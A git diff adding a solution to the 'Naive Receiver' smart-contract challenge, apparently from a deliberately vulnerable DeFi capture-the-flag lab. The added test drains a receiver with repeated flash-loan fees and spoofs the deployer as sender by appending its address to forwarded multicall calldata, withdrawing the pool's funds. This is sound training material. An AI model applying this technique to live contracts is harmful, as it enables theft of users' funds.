@@ -77,6 +77,55 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        // we can trigger a flashloan in the receiver contract, since the fee is 1 WETH and the contract balance is 10 WETH we can do this 10 times (using multicall) to get all those funds in the pool
+        // Then we just need to make sure that we can get the funds out of the pool and to the recovery address
+        // we can do this by adding 1 more transaction to the multicall, which would fake a withdrawal from the deployer by adding the deployer's address in the last 20 bytes of the call. This will make the _msgSender() function
+        // think that this tx comes from the deployer, which has deposited all the funds here so we can withdraw them all to the recovery account
+
+        // call flashloan for receiver 10 times
+        // @todo do this using multicall, use abi.encodeCall
+        bytes[] memory calldatas = new bytes[](11);
+
+        for(uint256 i = 0; i < 10; i++){
+            calldatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 1, bytes("")));
+        }
+
+        bytes20 deployerbytes = bytes20(address(deployer));
+
+        // add withdraw to the calldatas
+        calldatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (1010 ether, payable(recovery))), deployerbytes);
+
+
+        // @todo request should be created for multicall tx alltogether!
+        bytes memory allCalldata = abi.encodeCall(pool.multicall, calldatas);
+
+        // Step 1: Create request
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player,
+            target: address(pool), // we call this contract as target
+            value: 0,
+            gas: 10_000_000,
+            nonce: 0,
+            data: allCalldata,
+            deadline: block.timestamp + 1 hours
+        });
+
+       
+        bytes32 request = keccak256(
+            abi.encodePacked("\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(req))
+        );
+
+        // Step 3: Sign it using Foundry cheatcodes
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Step 4: Call the forwarder
+        bool success = forwarder.execute{value: 0}(req, signature);
+
+        assertTrue(success);
         
     }
 
